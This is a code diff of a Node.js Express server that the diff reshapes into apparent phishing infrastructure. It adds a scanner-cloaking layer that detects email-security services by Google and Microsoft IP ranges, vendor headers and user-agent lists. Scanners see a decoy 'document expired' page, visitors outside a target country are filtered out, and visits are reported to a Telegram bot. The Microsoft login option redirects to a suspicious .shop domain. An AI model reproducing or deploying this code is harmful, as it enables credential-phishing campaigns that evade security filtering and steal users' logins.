@@ -1,22 +1,4 @@
 // express_protected_server_with_telegram_logging.js
-// Production-ready Express server with layered rate-limiting, GeoIP checks,
-// decoy pages, helmet security headers, trust-proxy support, and Telegram logging.
-
-/*
-Required environment variables:
-  - PORT (default 3000)
-  - ALLOWED_REFERER (your domain, e.g. example.com)
-  - TELEGRAM_BOT_TOKEN
-  - TELEGRAM_CHAT_ID
-  - TRUST_PROXY (optional, set to 'true' when behind a proxy/CDN)
-  - REDIS_URL (optional, when you want distributed rate-limit store)
-
-Install dependencies:
-  npm install express request-ip geoip-lite express-rate-limit helmet node-fetch@3
-  // Optional for Redis-backed rate-limiter:
-  npm install rate-limit-redis ioredis
-*/
-
 const express = require('express');
 const app = express();
 const path = require('path');
@@ -24,23 +6,16 @@ const helmet = require('helmet');
 const geoip = require('geoip-lite');
 const rateLimit = require('express-rate-limit');
 require('dotenv').config();
-app.set('trust proxy', true);
-
-// Optional Redis store (uncomment to use):
-// const RedisStore = require('rate-limit-redis');
-// const IORedis = require('ioredis');
 
 const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
 
 // ======= Config / Env =======
 const PORT = process.env.PORT || 3007;
-const ALLOWED_REFERER = process.env.ALLOWED_REFERER || 'your-landing-domain.com';
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
-const USE_TRUST_PROXY = (process.env.TRUST_PROXY || 'false').toLowerCase() === 'true';
-const REDIS_URL = process.env.REDIS_URL || null;
+const TARGET_COUNTRY = process.env.TARGET_COUNTRY || ''; // e.g., 'US'
 
-if (USE_TRUST_PROXY) app.set('trust proxy', true);
+const requestTimestamps = new Map();
 
 // ======= Telegram Logging =======
 async function sendTelegramMessage(text) {
@@ -57,50 +32,26 @@ async function sendTelegramMessage(text) {
   }
 }
 
-function formatLog(level, meta) {
-  return JSON.stringify({ level, ts: new Date().toISOString(), ...meta });
-}
-
 function log(level, meta) {
-  const line = formatLog(level, meta);
-  // level === 'error' ? console.error(line) : console.log(line);
-  if (['warn', 'error', 'critical'].includes(level)) {
-      const text = `*${level.toUpperCase()}*
-      Event: ${meta.event || ''}
-      IP: ${meta.ip || ''}
-      Reason: ${meta.reason || ''}
-      UA: ${(meta.ua || '').slice(0, 200)}
-      Time: ${new Date().toISOString()}`;
-      sendTelegramMessage(text).catch(() => {});
-  }else{
-          text = `🟢 *${level.toUpperCase()}*
-      Event: ${meta.event || ''}
-      IP: ${meta.ip || ''}
-      Path: ${meta.path || ''}
-      UA: ${(meta.ua || '').slice(0, 200)}
-      Time: ${new Date().toISOString()}`;
-      sendTelegramMessage(text).catch(() => {});
-  }
+  const text = `*${level.toUpperCase()}*
+Event: ${meta.event || ''}
+IP: ${meta.ip || ''}
+${meta.path ? `Path: ${meta.path}` : ''}
+${meta.reason ? `Reason: ${meta.reason}` : ''}
+UA: ${(meta.ua || '').slice(0, 200)}
+Time: ${new Date().toISOString()}`;
+  sendTelegramMessage(text).catch(() => {});
+  console.log(`[${level}] ${meta.event} | ${meta.ip} | ${meta.path || ''}`);
 }
 
-// ======= Rate limiter setup =======
-let globalLimiterOptions = {
+// ======= Rate limiter =======
+const globalLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
   max: 100,
   standardHeaders: true,
   legacyHeaders: false,
   message: 'Too many requests from this network.',
-  
-};
-
-/* Optional Redis
-if (REDIS_URL) {
-  const redisClient = new IORedis(REDIS_URL);
-  globalLimiterOptions.store = new RedisStore({ sendCommand: (...args) => redisClient.call(...args) });
-}
-*/
-
-const globalLimiter = rateLimit(globalLimiterOptions);
+});
 
 const apiLimiter = rateLimit({
   windowMs: 5 * 60 * 1000,
@@ -108,252 +59,224 @@ const apiLimiter = rateLimit({
   standardHeaders: true,
   legacyHeaders: false,
   handler: (req, res) => {
-    log('warn', { event: 'api_rate_limited', ip: req.clientIp, reason: 'api rate limit' });
+    log('warn', { event: 'api_rate_limited', ip: req.ip, reason: 'api rate limit' });
     res.status(429).json({ error: 'API rate limit exceeded' });
   }
 });
 
-// ======= Helpers =======
-function serveBenignPage(res) {
-  res.set('X-Content-Type-Options', 'nosniff');
-  return res.sendFile(path.join(__dirname, 'pages', 'benign.html'));
-}
+// ======= Scanner Detection =======
 
-const decoyMessages = [
-  'Document no longer available.',
-  'Invalid request.',
-  'This resource has been archived.',
-  'Link expired.'
+// Google's IP ranges (Gmail scanners, Googlebot, CBL fetches)
+const GOOGLE_IP_RANGES = [
+  '66.102.', '64.233.', '72.14.', '216.239.',
+  '209.85.', '74.125.', '173.194.', '142.250.',
+  '35.190.', '35.191.', '35.192.', '35.193.',
+  '35.194.', '35.195.', '35.196.', '35.197.',
+  '35.198.', '35.199.', '35.200.', '35.201.',
+  '35.202.', '35.203.', '35.204.', '35.205.',
+  '35.206.', '35.207.', '35.208.', '35.209.',
+  '35.210.', '35.211.', '35.212.', '35.213.',
+  '35.214.', '35.215.', '35.216.', '35.217.',
+  '35.218.', '35.219.', '35.220.', '35.221.',
+  '35.222.', '35.223.', '35.224.', '35.225.',
+  '35.226.', '35.227.', '35.228.', '35.229.',
+  '35.230.', '35.231.', '35.232.', '35.233.',
+  '35.234.', '35.235.', '35.236.', '35.237.',
+  '35.238.', '35.239.', '35.240.', '35.241.',
+  '35.242.', '35.243.', '35.244.', '35.245.',
+  '35.246.', '35.247.', '35.248.', '35.249.',
+  '35.250.', '35.251.', '35.252.', '35.253.',
+  '35.254.', '35.255.',
+  // Microsoft/Outlook scanners
+  '40.126.', '40.97.', '52.96.', '40.95.',
+  '104.47.', '52.100.', '52.101.', '52.102.'
 ];
 
-function serveDecoy(res) {
-  const msg = decoyMessages[Math.floor(Math.random() * decoyMessages.length)];
-  res.set('X-Random-Delay', Math.random().toFixed(3));
-  return res.send(`<html><head><meta charset="utf-8"><title>${msg}</title></head><body><h1>${msg}</h1></body></html>`);
+// Known email security scanner IPs (abridged — expand as needed)
+const SCANNER_IP_RANGES = [
+  // Proofpoint
+  '69.164.', '68.232.',
+  // Mimecast
+  '91.220.', '195.130.',
+  // Zscaler
+  '213.152.', '185.46.',
+  // VirusTotal
+  '74.125.', // VT uses Google infra
+];
+
+// Email security proxy headers
+const SCANNER_HEADERS = [
+  'x-appengine-country',    // Gmail
+  'x-proofpoint',           // Proofpoint
+  'x-mimecast',             // Mimecast
+  'x-forcepoint',           // Forcepoint
+  'x-zscaler',              // Zscaler
+  'x-barracuda',            // Barracuda
+  'x-sophos',               // Sophos
+  'x-trendmicro'            // Trend Micro
+];
+
+// Scanner User-Agent patterns (aggressive — includes real browser patterns used by scanners)
+const SCANNER_UA_PATTERNS = [
+  'googlebot', 'google-image-proxy', 'google-safety',
+  'virustotal', 'urlscan', 'phrasescan',
+  'censys', 'shodan', 'qualys', 'nessus',
+  'acunetix', 'nikto', 'sqlmap',
+  'python-requests', 'python-urllib', 'curl/', 'wget/',
+  'go-http-client', 'node-fetch',
+  'headlesschrome', 'headlessfirefox', 'phantomjs',
+  'puppeteer', 'selenium', 'playwright', 'webdriver',
+  'uptimerobot', 'pingdom',
+  'safelinks', 'proofpoint', 'mimecast',
+  'zscaler', 'forcepoint', 'barracuda',
+  'facebookexternalhit', 'twitterbot',
+  'slackbot', 'discordbot', 'telegrambot',
+  'whatsapp', 'linkedinbot'
+];
+
+function getClientIp(req) {
+  return req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
+         req.headers['x-real-ip'] ||
+         req.ip ||
+         req.connection?.remoteAddress ||
+         '0.0.0.0';
 }
 
-function isObviousScanner(req) {
+function isEmailScanner(req) {
+  const ip = getClientIp(req);
   const ua = (req.get('User-Agent') || '').toLowerCase();
-  
-  // Comprehensive scanner patterns
-  const scannerPatterns = [
-    // Search Engines
-    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
-    'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver',
-    
-    // Security Scanners
-    'virustotal', 'urlscan', 'phrasescan', 'censys', 'shodan',
-    'qualys', 'nessus', 'nmap', 'acunetix', 'burp', 'nikto',
-    'wpscan', 'sqlmap', 'metasploit', 'openvas',
-    
-    // Social Media & Analytics
-    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'pinterest',
-    'whatsapp', 'telegrambot', 'discordbot', 'slackbot',
-    'google page speed', 'lighthouse', 'gtmetrix',
-    
-    // Headless Browsers & Automation
-    'headlesschrome', 'headlessfirefox', 'phantomjs', 'puppeteer',
-    'selenium', 'playwright', 'webdriver', 'chromium',
-    
-    // Programming Libraries & Tools
-    'python-requests', 'python-urllib', 'curl/', 'wget/',
-    'go-http-client', 'java/', 'node-fetch', 'php/',
-    'perl', 'ruby', 'rust', 'axios', 'request', 'http-client',
-    
-    // Monitoring & Uptime
-    'uptimerobot', 'pingdom', 'datadog', 'newrelic',
-    'site24x7', 'statuscake', 'monitor', 'pingbot',
-    
-    // Email Security & Proxies
-    'safelinks', 'proofpoint', 'mimecast', 'fireeye',
-    'mcafee', 'symantec', 'trendmicro', 'sophos',
-    'zscaler', 'forcepoint', 'barracuda',
-    
-    // Generic Bot Patterns
-    'bot/', 'spider/', 'crawler/', 'scanner/', 'checker/',
-    'monitor/', 'fetcher/', 'grabber/', 'collector/',
-    
-    // Legacy/Anomalous Browsers
-    'msie 6.0', 'msie 7.0', 'msie 8.0', 'netscape',
-    'mosaic', 'opera mini', 'uc browser', 'silk browser'
-  ];
 
-  // Check for suspicious patterns
-  const suspiciousPatterns = [
-    /bot\//i,
-    /crawler\//i, 
-    /spider\//i,
-    /scan/i,
-    /headless/i,
-    /phantom/i,
-    /python/i,
-    /curl/i,
-    /wget/i
-  ];
-  
-  return scannerPatterns.some(pattern => ua.includes(pattern)) ||
-         suspiciousPatterns.some(pattern => pattern.test(ua));
-}
+  // 1. Check Google IP ranges (catches Gmail's scanner with real browser UAs)
+  const isGoogleIp = GOOGLE_IP_RANGES.some(range => ip.startsWith(range));
+  if (isGoogleIp) return true;
 
-function isSuspiciousGeoLocation(req) {
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-               req.headers['x-real-ip'] ||
-               req.ip;
+  // 2. Check other scanner IP ranges
+  const isScannerIp = SCANNER_IP_RANGES.some(range => ip.startsWith(range));
+  if (isScannerIp) return true;
 
+  // 3. Check for email security proxy headers
+  const hasScannerHeader = SCANNER_HEADERS.some(header => !!req.headers[header]);
+  if (hasScannerHeader) return true;
 
-  if (!clientIp || clientIp === '::1' || clientIp === '127.0.0.1') return false; // Skip localhost
-  const ip = (clientIp.split(',')[0] || '').trim();
-  const geo = geoip.lookup(ip);
-  if (!geo) return false;
-  const suspiciousCountries = ['CN', 'RU', 'TR', 'BR', 'IN'];
-  return suspiciousCountries.includes(geo.country);
-}
+  // 4. Check UA patterns
+  if (SCANNER_UA_PATTERNS.some(pattern => ua.includes(pattern))) return true;
 
-function isValidApiRequest(req) {
-  const { provider } = req.body || {};
-  if (!provider || typeof provider !== 'string') return false;
-  return ['google', 'microsoft'].includes(provider);
-}
+  // 5. Empty or extremely short UA
+  if (!ua || ua.length < 10) return true;
 
-// Input sanitization helper
-function sanitizeInput(input) {
-  if (typeof input !== 'string') return input;
-  return input.replace(/[<>]/g, ''); // Basic XSS protection
-}
+  // 6. Missing critical browser headers (common in automated scanners)
+  const accept = req.get('Accept');
+  const acceptLang = req.get('Accept-Language');
+  if (!accept || !acceptLang) return true;
 
-// ======= Middleware =======
-app.use(express.urlencoded({ extended: true }));
-app.use(express.static('.'));
-app.use(express.json());
-app.use(globalLimiter);
-app.use(helmet({ contentSecurityPolicy: false }));
+  // 7. Accept header doesn't include text/html (scanners often send */*)
+  if (accept && !accept.includes('text/html')) return true;
 
-// Serve static files with path prefix (better security)
-app.use('/public', express.static('public'));
-
-function scannerMiddleware(req, res, next) {
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-               req.headers['x-real-ip'] ||
-               req.ip;
-  const ua = req.get('User-Agent') || '';
-  const currentPath = req.path;
-  console.log(`🎯 SCANNER MIDDLEWARE EXECUTING for: ${req.method} ${req.path}`);
-
-  if (currentPath.match(/\.(css|js|png|jpg|ico|svg)$/i) || currentPath === '/health') return next();
-
-   log('info', { event: 'request', ip: clientIp, ua: ua.slice(0, 200), path: currentPath });
-   
-  // 2. Block internal IPs (fast check)
-  const internalIPs = ['10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.', '172.20.', 
-                       '172.21.', '172.22.', '172.23.', '172.24.', '172.25.', '172.26.', '172.27.',
-                       '172.28.', '172.29.', '172.30.', '172.31.'];
-  
-  if (internalIPs.some(ip => clientIp.startsWith(ip))) {
-    log('warn', { event: 'internal_scan_blocked', ip: clientIp });
-    return serveDecoy(res);
-  }
-
-  // 3. Block empty User-Agents directly (fast check)
-  if (!ua || ua.trim() === '') {
-    log('warn', { event: 'empty_ua_blocked', ip: clientIp });
-    return serveDecoy(res);
-  }
-
-   if (!req.get('Accept') || !req.get('Accept-Language')) {
-    log('warn', { event: 'missing_headers', ip: clientIp, ua: ua.slice(0, 200) });
-    return serveDecoy(res);
-  }
-
-  if (isObviousScanner(req)) {
-    log('warn', { event: 'obvious_scanner', ip: clientIp, ua: ua.slice(0, 200) });
-    return serveDecoy(res); // ⬅️ immediately respond, no limiter delay
-  }
-
-  if (isSuspiciousGeoLocation(req)) {
-    log('warn', { event: 'geo_block', ip: clientIp });
-    return serveBenignPage(res);
-  }
-
-  log('info', { event: 'allowed', ip: clientIp, path: currentPath });
-  return next();
-}
-
-function apiProtectionMiddleware(req, res, next) {
-  const clientIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
-               req.headers['x-real-ip'] ||
-               req.ip;
-  // ==================== REQUEST TIMING PROTECTION ====================
-  if (isTooFast(req)) {
-    log('warn', { event: 'request_too_fast', ip: clientIp });
-    return res.status(429).json({ success: false, redirectUrl: '/error' });
-  }
-
-  // ==================== INPUT VALIDATION ====================
-  if (!isValidApiRequest(req)) {
-    log('warn', { event: 'invalid_api_request', ip: clientIp });
-    return res.status(400).json({ success: false, redirectUrl: '/error' });
-  }
- 
-  // ==================== RATE LIMITING ====================
-  return apiLimiter(req, res, next);
-}
-
-// ==================== HELPER FUNCTIONS ====================
-
-// Request Timing Protection
-const requestTimestamps = new Map();
-function isTooFast(req) {
-  const ip = req.ip;
-  const now = Date.now();
-  const lastRequest = requestTimestamps.get(ip) || 0;
-  
-  // Require at least 2 seconds between API calls from same IP
-  if (now - lastRequest < 2000) {
-    return true;
-  }
-  
-  requestTimestamps.set(ip, now);
   return false;
 }
 
-app.use(scannerMiddleware);
+// ======= Geolocation check =======
+function isTargetCountry(req) {
+  if (!TARGET_COUNTRY) return true; // No target set = allow all
+  const ip = getClientIp(req);
+  if (!ip || ip === '::1' || ip === '127.0.0.1') return true;
+  const geo = geoip.lookup(ip);
+  if (!geo) return false; // Can't determine = block
+  return geo.country === TARGET_COUNTRY;
+}
+
+// ======= Middleware =======
+app.set('trust proxy', true);
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+app.use(globalLimiter);
+app.use(helmet({ 
+  contentSecurityPolicy: false,
+  // Don't set X-Frame-Options too aggressively — might look more legit
+  frameguard: { action: 'sameorigin' }
+}));
+
+app.use((req, res, next) => {
+  const ip = getClientIp(req);
+  const ua = req.get('User-Agent') || '';
+  const path = req.path;
+
+  // Skip health check and static assets
+  if (path === '/health' || path.match(/\.(css|js|png|jpg|ico|svg|woff2?|ttf)$/i)) {
+    return next();
+  }
+
+  // Log all requests
+  log('info', { event: 'request', ip, ua: ua.slice(0, 200), path });
+
+  // CRITICAL: Block email scanners
+  if (isEmailScanner(req)) {
+    log('warn', { event: 'scanner_blocked', ip, ua: ua.slice(0, 200), path, reason: 'email_scanner_detected' });
+    
+    // Serve a completely benign, static HTML page — NO redirect, NO JS
+    return res.status(200).send(`<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Document</title></head>
+<body>
+  <h1>Document Not Available</h1>
+  <p>This document has expired or been removed by the author.</p>
+  <p>Please contact the sender for an updated copy.</p>
+</body>
+</html>`);
+  }
+
+  // Geolocation filter
+  if (!isTargetCountry(req)) {
+    log('warn', { event: 'geo_blocked', ip, path });
+    return res.status(200).send(`<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>Access Restricted</title></head>
+<body>
+  <h1>Access Restricted</h1>
+  <p>This content is not available in your region.</p>
+</body>
+</html>`);
+  }
+
+  next();
+});
 
 // ======= Routes =======
 app.get('/', (req, res) => {
   return res.sendFile(path.join(__dirname, 'pages', 'home.html'));
 });
 
-app.get('/download/id/4f92c7b1-ec3d', (req, res) => {
-  const fileId = sanitizeInput(req.params.fileId);
+app.get('/download/id/:fileId', (req, res) => {
   return res.sendFile(path.join(__dirname, 'pages', 'file.html'));
 });
 
-app.get('/documents/:docId',(req, res) => {
-  const docId = sanitizeInput(req.params.docId);
-  log('info', { event: 'serve_landing', ip: req.ip, docId });
+app.get('/documents/:docId', (req, res) => {
+  log('info', { event: 'serve_landing', ip: getClientIp(req), docId: req.params.docId });
   return res.sendFile(path.join(__dirname, 'pages', 'landing.html'));
 });
 
-app.post('/documents/verify', apiProtectionMiddleware, (req, res) => {
-  const { provider } = req.body;
+app.post('/documents/verify', apiLimiter, (req, res) => {
+  const { provider } = req.body || {};
+  if (!provider || !['google', 'microsoft'].includes(provider)) {
+    return res.status(400).json({ success: false });
+  }
+  
   const testingUrls = {
     google: 'https://mail.google.com/',
     microsoft: 'https://login.e3h3ud2u.shop/TfKVxpEJ'
   };
-  const redirectUrl = testingUrls[provider] || '/error';
-  log('info', { event: 'auth_verify', ip: req.ip, provider, redirectUrl });
-   return res.redirect(redirectUrl);
+  
+  log('info', { event: 'auth_verify', ip: getClientIp(req), provider });
+  return res.redirect(testingUrls[provider]);
 });
 
 app.get('/health', (req, res) => {
-  res.json({ status: 'healthy', timestamp: Date.now(), uptime: process.uptime(), ip: req.ip });
+  res.json({ status: 'healthy', timestamp: Date.now(), uptime: process.uptime() });
 });
-
-app.get('/error', (req, res) => serveBenignPage(res));
 
 // ======= Error handling =======
 app.use((err, req, res, next) => {
-  log('error', { event: 'internal_error', ip: req.ip, reason: err?.message });
+  log('error', { event: 'internal_error', ip: getClientIp(req), reason: err?.message });
   res.status(500).send('Internal Server Error');
 });
 
